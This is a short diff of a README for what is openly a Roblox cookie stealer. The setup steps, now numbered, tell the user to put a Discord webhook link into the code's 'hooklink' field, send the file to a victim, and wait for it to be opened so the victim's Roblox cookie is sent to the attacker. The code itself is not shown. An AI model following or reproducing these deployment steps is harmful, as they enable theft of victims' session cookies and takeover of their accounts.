@@ -2,9 +2,9 @@
 
 #Setup
 
-Open the code
-Change the "hooklink" to your discord webhook link
-Send to your victim and wait for it to open
+1. Open the code
+2. Change the "hooklink" to your discord webhook link
+3. Send to your victim and wait for it to open
 
 THE ROBLOX COOKIE WILL SEND TO YOU
 
